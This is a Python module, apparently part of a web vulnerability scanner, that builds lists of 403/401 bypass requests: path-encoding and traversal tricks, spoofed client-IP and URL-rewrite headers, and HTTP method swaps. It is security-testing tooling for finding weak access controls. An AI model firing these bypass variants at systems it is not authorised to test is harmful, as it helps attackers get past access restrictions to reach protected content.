"""403/401 bypass fold (the nomore403 idea, built in).

A 403 means "exists but denied" — often a thin ACL that a path/header/method
trick walks around. When a 403/401 is found, this emits a curated set of bypass
variants (the same families nomore403/bypass-403 use); the scanner fires them and
a 2xx that survives soft-404 verification is reported as a real bypass, so the
report says which 403s actually hide content vs which are just a wall.

Each variant is (label, method, request_path, extra_headers).
"""

from __future__ import annotations

_IP_HEADERS = ("X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Client-IP",
               "X-Real-IP", "X-Remote-Addr", "True-Client-IP", "Client-IP")


def _swapcase(p: str) -> str:
    return "/" + p.lstrip("/").swapcase()


def variants(path: str) -> list[tuple[str, str, str, dict]]:
    """Curated 403-bypass attempts for `path` (deduped, order = likelihood)."""
    p = "/" + path.lstrip("/")
    out: list[tuple[str, str, str, dict]] = []

    # --- path manipulation (GET, no extra headers) ---
    path_muts = [
        p + "/", p + "/.", p + "//", "/%2e" + p, p + "%20", p + "%09",
        p + "..;/", p + ";/", p + "/..;/", p + "?", p + "#", p + ".json",
        p + ".html", p.upper(), _swapcase(p), "/." + p, "//" + p.lstrip("/"),
    ]
    for m in dict.fromkeys(path_muts):
        if m and m != p:
            out.append((f"path {m}", "GET", m, {}))

    # --- header injection (same path) ---
    for h in _IP_HEADERS:
        out.append((f"header {h}: 127.0.0.1", "GET", p, {h: "127.0.0.1"}))
    out.append(("header X-Custom-IP-Authorization: 127.0.0.1", "GET", p,
                {"X-Custom-IP-Authorization": "127.0.0.1"}))
    out.append(("header X-Forwarded-Host: localhost", "GET", p,
                {"X-Forwarded-Host": "localhost"}))
    # X-Original-URL / X-Rewrite-URL: request root, point the header at the target
    out.append(("header X-Original-URL", "GET", "/", {"X-Original-URL": p}))
    out.append(("header X-Rewrite-URL", "GET", "/", {"X-Rewrite-URL": p}))

    # --- method swap (only verbs that can return the *content*; HEAD/OPTIONS
    # return no body and TRACE just echoes, so they'd be false bypasses) ---
    for meth in ("POST", "PATCH"):
        out.append((f"method {meth}", meth, p, {}))

    return out
